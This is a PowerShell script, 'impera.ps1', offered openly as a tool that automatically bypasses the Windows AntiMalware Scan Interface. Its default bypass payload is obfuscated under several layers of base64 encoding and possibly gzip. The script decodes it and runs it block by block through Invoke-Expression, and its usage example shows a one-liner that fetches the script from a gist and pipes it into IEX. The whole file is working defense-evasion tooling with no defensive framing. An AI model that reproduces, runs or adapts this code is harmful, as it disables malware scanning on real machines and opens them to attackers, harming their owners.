<#
.Description
AntiMalware Scan Interface bypass automator
.PARAMETER Abypass
Base64-encoded custom AntiMalware Scan Interface bypass.
.EXAMPLE
PS> . .\impera.ps1; Invoke-Impera
PS> iwr https://gist.githubusercontent.com/(...)/impera.ps1 | IEX; Invoke-Impera -ABypass "aGVsbG90a(...snip...)GVyZcKgCg=="
.SYNOPSIS
This is a tool to automatically bypass AntiMalware Scan Interface
#>

function Invoke-Impera {
  [CmdletBinding()]
  param (
      [Parameter(Mandatory = $false)][string]$ABypass = "VlRCU1UyVnNUbFpVYTJ4U1lXeHdVVlpxUmtkU1JrW"+"lZVMnRrYTFJd01UVlpWRTVYWVRGT1NGb3paRkpXVnprMFZteFNTbVZWTkhsVGJFSlNZVEJyTVZwRmFFcE5iRVYzWkVWS1ZrMUhlRlJWVjNodlVURlZlVmR0YUdoU1ZUVkpWVlprYTAxSFNuSlBXR1JoVFd0d01sUldhRWRsUmxaeFlUTmtVbFo2YkVoVk1WSlNaREZyZVZOdVFtaFNhelV6VmxSS2JtVnRSa2RWYkZaTlpXczFORlZzYUZkWFYwWjBWbTFzVTJKVWEzbFdiVEZxVGtaS1JtVkZWbFZOYkhCUFdXeGFVMk14V2taT1ZWSnFWMGhDVTFsV2FHRk9WbHBKVm1wR1ZGTkZTalZaTW5SUFZGWmtTRTVJWkZSaVYyZDNXa1prVjFKdFNsaFBWbXhNVFRCVk1GbFVTbUZTUm5CWVpVUlNVbFpyTkhsYVZXUnZaV3N3ZUdOSFJrOVdWbFY0VkVSR2IxUXhaSE5UYmtwV1lsUkdkVnBXYUVwTmJVbDNaVVpzV0ZKWVVuWlVWV2hMVlVkV2MyTkdhRlZXVkVaTlZrYzFZVTF0U2paVGFrWnJUV3N4TlZkclVrdFRNbEY0WVVaYWFWSllRa3BhUjNCUFRWWmFTV05HUmxaaVYwMTNVM3BKTVZKVk1IZFhXR3hXVFZkU1VsVlhkRE5rYkZZMlZHeEthMUpIZUZSVVYzaHZZbXN4VlZOVVRrOVdWRlo1VkRGa01GUkdValpXYWxaclVrVTFjbFpJY0ZabFIxWkdWMnBhVmsxSVVrMWFWbVF3Wld4S1NGZFVUbE5XV0dRMVZXdFdkbVF4WkVaV2JXaFlVbTFqZUZwRmFGZFVSMVpKVVd0YVZWSXhWalJaVlZwVFZGWk5lbEZzU210TlYzaHpWbXBDYzAxVk5WaGpNMmhhWVRCYVUxUlVSbXRUYlVaeVQwUktUbFo2YkZsV1IzaERZbTFTUlZKdGVHaFNXR2h5V1RGb1EyUnNaRWhOVlhCT1VteHdVVlJXWkhOU1YxSjBWVzEwVDFaWGFIQlpWVlpYWVZaS2RFNVZPV3hpYkZwNVUzcENkMkpXY0hKU2JYQlZaV3RLVTFsVVRuTk5SMUpHWlVjNVZGSnNTa3BhUjNRd1pVZEpkMUp1UmxWWFJUVlhWVlJCTkUxR1JYcFZWRVpvVWpGYVlWZFhNRFJOTVZKeFZtNVdhRk5HV2pKVWJYQkhZa1pTVjFGck1XbE5WMmhhVkRCTk5FNUdVa1ZSVkZaV1VrVTFObFpVUWtkaFZtUlpXa2hDVDAxdGVIZFdNalZEVFVaS2NtTjZUbUZpUlZwR1ZteFdXazVGTVZkV2JscGFZbGhTTVZaSGREUmtWbEpYV2toV1lVMXVhSFpVVkU1aFlWVTBlVTVWZUZSaVJWcFZWa1pOTldKSFZrVlNiVEZwVWpKU1dscFZhRUpOVm1SSVlVaFdhVkpyU2pGWlZ6RlhZa2RGZDFSWWNGaFdWVEI0VlZST2FrMVdWbk5pUjNCVVRWVmFkRlZ0Y0hOV1JteFhWVzVrVTJKc1drVlZWM2hYVkdzd2VsWnRPVnBXTVVsNlZHdG9iMVJzVmxWYVJURlRUVEo0VUZwVmFFWmtNSE4zWlVab2EySnVRa2RXUnpWUFV6RldXR1JFV21oaGJYaE1WRlZvZGsxV2JEVmtSVnByWVdzd2QxUXhWbGRYUmxKSFlVWkNWbFp0YUhKV1ZscDNWa1phUlZadVpHaE5hMXAwVjJ4b1ExVkdVbkZhUmtKV1UwVkdORlJYY0VkT1JrWldZa1pPVm1KVk5IZFZNV2hIVjFaT1dHRkljRnBpVjAweFZrVlNUazVHU2paVGJuQnJUVzVvUmxSVlpIWmxSa1p5WVhwS1UxSllVbEJXVnpGM1ZERk9SbEp0TlU1aE1sSkZWREJrZDFOVk5IZGpSV3hUVFVSR1VsbHNVazVsUlRGelZtNWtUMDFFVVhoVVZsSkRWVzFHVjJOSE5VOVdNMmd4VldwR1MxZHNWWGhTYkd4T1YwVTFTRlpWYUU5WlZsWTJVbFJTV0ZaWFVqUmFWM2hYVTBkRmVsTnVTbXBTUjNNd1ZUQm9TMkpzYkhOaVNFSnNZVEJ3YjFWclRUUmxiR1JHWVVoT1ZFMVZTbFJaZWtKaFZrWmtXVk5zWkZOVFJUVXdXV3RhUjFKVk1WaGxSWEJZVjBaYVExWlljRzlrTVVwR1RWWmtWbVZyY0VsWk1WSlBZekpHZEZWdGJGcE5SRUV4V1d4a2QxZFhSblJUYkVwb1ZrWkdNbFp1YkRCamJGRjVaVVZ3VDFJeWFFUmFSV2hIVmpGYWRWVnNWbGhoZWxaMldrUkdVMUpYVmtoTlJFNW9WbFUxVmxVd1ZsTlpWMDVVVDFkb2ExTkhlRWxWTUZwTFRrZEtWbUY2VGxaaVYwNDBWMnhhYzJSR1RrWmpTR1JXWWtWd05GbFdhR3BrYlZKSlZHdEthRkpHUlhkWk1uUXdWVmRPZEZadWNGSk5ibEY2VkRCVk1VNUhUbFppUm5CUFRVaFNORmw2UW5kVE1WWjBUMGhrVDFKNlZURldWRTVoVTIxU1JsUnRPVkppYTBvMldYcENjMUl5VWpaYVIyeG9VbTFOTUZsV1ZsTlpWWGQ1WTBWb2JGTkdWWGxVYm5CTFZWWktXVnBGV21saE1EVkRWV3RqZUdWc2JITlVXR3hPVmxaRk1GbFVTakJYYlVaVllVVjBUbUpVVmtOVWFrNVNUa1UxTm1GRlNrOU5SMmhhV1cweFQxSkhVWGRPVlZaVFlrZFNkVmx0ZUZOT1ZsVjVaVWRzVkZZd2NHOVVNVlkwVFZaa1IxUnRkRnBOYTNCUFYyeFdVMUpHYTNsalJURlhUVEJ3ZGxSc1drZE5WbXhWVlZoS1UyRXdOVVJaVm1oTFVteHdjazFWZEd4aVZGWnZWR3hqZUdOVk1WaE5TR2hXVWtWcmVWVXhhRU5TUjBweVZHcEdWMVpIWkRKWGJYaGhZVlpTVldKSWJHeGhhMHB2VlcxMFRtUXlUbGRTV0doYVRUSm9NRlV5Y0U5UmJVWklUMWhzVjJWck5WQldhMUpQVjFaRmQyUkVXazVWZW1oNVZURldWMlJzY0hKa00yaGFWbFpLV0ZsWGVFdGhWbEY1V1hwV1ZGWldTa3hWVmxKellteEtjbFp1UWxwTlYyaFRWR3BCTVUweFVsbGFSVXBTVmxkNFdGWlZZekJOYlZKeFdraFdWRlpHY0doWlZWcFBWa1UxV1dGSGVGaFRSVWt4VmpGb1QyVlhWa2RSYTNoU1YwZG9TVlpHVm01T1ZrNTFXa1JPVkZKVWJFdFdSV2hMVjBaa1JtUkhjRlJUUjJoMVZrVm9ZVTFXUm5KTlNGcFVWbXhLZVZwRlZUVlZiRnBIVVZoYVRFMUZWalZYYTFaVFYyMU9WbE5yY0ZoVFIzaExWVlJHUTJKRmMzbFNhazVoVFc1amVsUlZaRk5rTWxKWFZtNU9VMUpGU25OV1JFWkNUa1phU0U5SVdtRlNNVzh5V1d0a00yVnRTbkZoU0ZaYVZqQmFNRmt5TVRSbFYwbDRZVVpLYkdKV1dsUlZhMmhEVTFVNVJsZHFSbFZTVnpoNldsWldibU5zUmxaVldHUmhZVEJhUkZZd2FHOVJNVzkzVW10S1JGcDZNRGxEWnowOUNnPT0K"
  )
  function Decode-Base64 {
      param ( [string]$b64 )
      while ($true) {
        $newB64 = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($b64))
        try { [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($newB64)) }
        catch { break }
        $b64 = $newB64
      }
      return $b64
  }
  function Get-DecompressedABypass {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]
        [byte[]] $payload = $(Throw("-payload is required"))
    )
    Process {
        $input = New-Object System.IO.MemoryStream( , $payload )
        $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
        $gzipStream.CopyTo( $output )
        $gzipStream.Close()
        $input.Close()
        [byte[]] $byteOutArray = $output.ToArray()
        Write-Output $byteOutArray
    }
  } 
  $ABypassB64 = Decode-Base64 $ABypass
  if ($ABypassB64[-1].Length -gt 1) { $ABypassB64 = $ABypassB64[-1] }
  $ABypassClear = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($ABypassB64))
  try { 
    $bytes = [System.Convert]::FromBase64String($ABypassB64)
    $ABypassClear = Get-DecompressedABypass -payload $Bytes
    $AbypassClear = [System.Text.Encoding]::ASCII.GetString($ABypassClear)
  }
  catch { }
  $function = 0
  $comm_func = ""
  foreach ($command in $ABypassClear.split("`n")) {
    if ($command -ne "") {
        if ($command -like "*{*"){ $function = $function + ($command | Select-String -Pattern "{" -AllMatches).Matches.Count }
        if ($command -like "*}*"){ $function = $function - ($command | Select-String -Pattern "}" -AllMatches).Matches.Count }
        $comm_func = $comm_func += "`n"+$command
        if($function -eq 0){
            Invoke-Expression $comm_func
            $comm_func = ""
        }
    }
  }
  Write-Host "Divide et impera." -ForegroundColor Yellow -BackgroundColor Red
}